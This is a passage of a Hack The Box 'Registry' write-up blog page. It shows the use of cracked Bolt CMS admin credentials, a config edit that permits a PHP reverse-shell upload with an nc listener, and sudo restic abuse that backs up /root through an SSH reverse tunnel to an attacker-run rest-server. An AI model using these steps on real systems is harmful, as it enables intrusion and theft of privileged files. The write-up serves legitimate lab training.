+Cost <span class="m">1</span> <span class="o">(</span>iteration count<span class="o">)</span> is <span class="m">1024</span> <span class="k">for</span> all loaded hashes
+Will run <span class="m">4</span> OpenMP threads
+Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
+strawberry       <span class="o">(</span>?<span class="o">)</span>
+1g 0:00:00:05 DONE <span class="o">(</span>2020-04-03 14:02<span class="o">)</span> 0.1992g/s 71.71p/s 71.71c/s 71.71C/s strawberry..brianna
+Use the <span class="s2">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+Session completed
+</code></pre></td></tr></table>
+</div>
+</div><p>I used that creds(<code>admin:strawerry</code>) and logged in bolt cms.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="public/images/bolt_logged.jpg"
+        data-srcset="/registery/public/images/bolt_logged.jpg, public/images/bolt_logged.jpg 1.5x, /registery/public/images/bolt_logged.jpg 2x"
+        data-sizes="auto"
+        alt="/registery/public/images/bolt_logged.jpg"
+        title="bolt_logged" /></p>
+<p>Fig: Admin User</p>
+<h3 id="unprivileged-user">Unprivileged User</h3>
+<p>After logged in, I searched every part of cms and found the file upload field where I was unable to upload the <code>php</code> file. Since I was <code>admin</code> edited and added <code>php</code> extension in file <code>config.yml</code> which was located at url <code>http://registry.htb/bolt/bolt/file/edit/config/config.yml</code>  with a <code>php-reverse-shell.php</code> and listener on.
+I found one interesting blog <a href="https://fgsec.net/from-csrf-to-rce-bolt-cms/" target="_blank" rel="noopener noreffer">CSRF-TO-RCE</a> you can read it.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="public/images/rest_server.jpg"
+        data-srcset="/registery/public/images/rest_server.jpg, public/images/rest_server.jpg 1.5x, /registery/public/images/rest_server.jpg 2x"
+        data-sizes="auto"
+        alt="/registery/public/images/rest_server.jpg"
+        title="rest_server" />
+Fig: Uploaded File</p>
+<p><strong>Listner on</strong>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ nc -lvnp <span class="m">8888</span>
+listneing on <span class="o">[</span>any<span class="o">]</span> <span class="m">8888</span>
+
+connect to <span class="o">[</span>127.0.0.1<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>127.0.0.1<span class="o">]</span> <span class="m">58100</span>
+Linux bolt 4.15.0-65-generic <span class="c1">#74-Ubuntu SMP Tue Sep 17 17:06:04 UTC x86_64 </span>
+<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+/bin/sh: <span class="m">0</span> can<span class="s1">&#39;t access tty;job contorl turned off
+</span><span class="s1">$ $python -c &#34;import pty;pty.spawn(&#39;</span>/bin/bash<span class="err">&#39;</span><span class="o">)</span><span class="s2">&#34;
+</span><span class="s2">www-data@bolt:</span>$<span class="s2"> sudo -l 
+</span><span class="s2">Matching Defaults entries for www-data on bolt:
+</span><span class="s2">    env_reset, exempt_group=sudo, mail_badpass,
+</span><span class="s2">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+</span><span class="s2">
+</span><span class="s2">User www-data may run the following commands on bolt:
+</span><span class="s2">    (root) NOPASSWD: /usr/bin/restic backup -r rest*
+</span></code></pre></td></tr></table>
+</div>
+</div><p>As, I saw the <code>restic</code> server running as root then searched for files and got <code>backup.php</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="o">@</span><span class="nx">bolt</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">html</span><span class="err">$</span> <span class="nx">cat</span> <span class="nx">backup</span><span class="o">.</span><span class="nx">php</span>
+<span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">shell_exec</span><span class="p">(</span><span class="s2">&#34;sudo restic backup -r rest:http://backup.registry.htb/bolt bolt&#34;</span><span class="p">);</span>
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="restic-server">Restic Server</h4>
+<p>Then I searched about <code>restic</code> server and collected knowledge you can find <a href="https://restic.readthedocs.io/en/latest/" target="_blank" rel="noopener noreffer">here</a> and at first I download to my localhost then started the restic server as you can find file <a href="https://github.com/restic/rest-server" target="_blank" rel="noopener noreffer">rest-server</a>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ rest-server --path . --no-auth
+Data directory: .
+Authentication disabled
+Private repositories disabled
+Starting server on:8000
+Creating repository directories in .
+Creating repository directories in .
+</code></pre></td></tr></table>
+</div>
+</div><p>Now before directly using the <code>rest-server</code> in machine I used and in my local machine and it worked.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ restic -r http://10.10.14.129:8000 init
+enter password <span class="k">for</span> new repository:
+enter password again:
+created restic repository 39fcbee204 at rest:http://10.10.14.129:8000
+
+Please note that knowledge of your password is required to access the repository. Losing your password means that your data is irreversibly lost.
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="port-forwarding">Port Forwarding</h4>
+<p>After, it worked in my local machine I port forward from 8000 to 1234 ( this willn&rsquo;t work if your python is active at 8000 then it will route to another port ).</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ ssh bolt@10.10.10.159 -i id_rsa -R 1234:127.0.0.1:8000
+Enter passphrase <span class="k">for</span> key <span class="s1">&#39;id_rsa&#39;</span>:
+Welcome to Ubuntu 18.04.3 LTS <span class="o">(</span>GNU/Linux 4.15.0-65-generic	 x86_64<span class="o">)</span>
+
+	System information as of Mon Nov <span class="m">11</span> 14:1018 UTC <span class="m">2019</span>
+	
+	System Load: 0.02 			Users logged in:					<span class="m">1</span>
+	Usage of /: 6.5% of 61.80GB	IP address <span class="k">for</span> eth0:				10.10.10.159
+	Memory usage: 53%			IP address <span class="k">for</span> br-1bad9bd75d17: 	172.18.0.1
+	Swap usage: 1%				IP address of docker0: 			172.17.0.1
+	Processes: <span class="nv">206</span>
+	
+	<span class="o">=</span>&gt; There is <span class="m">1</span> zombies process.
+Last Login: Mon Nov <span class="m">11</span> 14:1018 <span class="m">2019</span> from 10.10.15.129
+bolt@bolt:~<span class="nv">$whoami</span>
+bolt
+</code></pre></td></tr></table>
+</div>
+</div><p>At first I used the full directory of <code>restic</code> server but that doesn&rsquo;t work so I used below command in <code>www-data</code> shell</p>
+<h3 id="rest-server-backup-files">Rest-Server Backup Files</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">www-data@bolt:~$ sudo restic backup -r rest:http://127.0.0.1:1234 /root/ 
+sudo restic backup -r rest:http://127.0.0.1:1234 /root/
+enter password <span class="k">for</span> repository: something
+
+password is correct 
+found <span class="m">1</span> old cache directories in /var/www/.cache/restic, pass --cleanup-cache to scan <span class="o">[</span>/root<span class="o">]</span>
+scanned <span class="m">18</span> directories, <span class="m">19</span> files in 0:00
+<span class="o">[</span>0:03<span class="o">]</span> 100.00% 39.690 KiB / 39.690 KiB <span class="m">37</span> /37 items <span class="m">0</span> errors ETA 0:00 duration: 0:03
+snapshot 4bf1b3af saved
+</code></pre></td></tr></table>
+</div>
+</div><p>Finally I restored and checked the <code>restic</code> server directory and got the files as</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ restic restore 4bf1b3af915544c9d15d4aa741731382c9fd2dc68ffec7f769a237aaf52c2c02
+enter password <span class="k">for</span> repository:
+repository 39fcbee2 opened succesfully, password is correct
+created new cache in /root/.cache/restic
+restorying &lt;Snapshot 4bf1b3af of <span class="o">[</span>/root<span class="o">]</span> at 2019-11-11 14:13:38.38.895820081 +0000 UTC &gt; root@bolt to .
+</code></pre></td></tr></table>
+</div>
+</div><p>Then I checked back to the folder <code>snapshot</code> and got the <code>root.txt</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-markdown" data-lang="markdown">root@gr4n173:~/snapshots$ ls
+4bf1b3af915544c9d15d4aa741731382c9fd2dc68ffec7f769a237aaf52c2c02  root
+root@gr4n173:~/snapshots$ cd root
+root@gr4n173:~/snapshots/root$ ls
+config.yml  cron.sh  root.txt
+root@gr4n173:~/snapshots/root$ cat root.txt
+ntrkz*********************
+</code></pre></td></tr></table>
+</div>
+</div><p>This way I got the root of Registry box and learned alot from this box. So I would like to thank creator of this box <code>thek</code> for such an awesome box. Especially downloading the backup files from restic server was new one.</p>
+<p>I will be posting writeup of next box after box retired. I would like to Thank readers for being with me through out this writeup.</p>
+<p>Feedback are really appreciated !!</p>
+<p>Tweet about this writeup if you like.</p>
+<p>You can see more blog at my medium here: <a href="https://medium.com/@gr4n173" target="_blank" rel="noopener noreffer">gr4n173</a>.</p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2020-05-01</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/registery/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.com/registery/" data-title="Registry" data-via="gr4n173" data-hashtags="htb,linux,boltcms,restic-server,port-forward"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.com/registery/" data-hashtag="htb"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.com/registery/" data-title="Registry"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.com/registery/" data-title="Registry"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@2.14.0/icons/line.svg"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.com/registery/" data-title="Registry"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/htb/">htb</a>,&nbsp;<a href="/tags/linux/">linux</a>,&nbsp;<a href="/tags/boltcms/">boltcms</a>,&nbsp;<a href="/tags/restic-server/">restic-server</a>,&nbsp;<a href="/tags/port-forward/">port-forward</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+            <a href="/moee-1/" class="next" rel="next" title="Moee-1">Moee-1<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Lots of Love</div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">xxxx</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">gr4n173</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.2.0/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@7.0.4/dist/typeit.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{},"data":{"id-1":"gr4n173","id-2":"gr4n173"},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.en","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
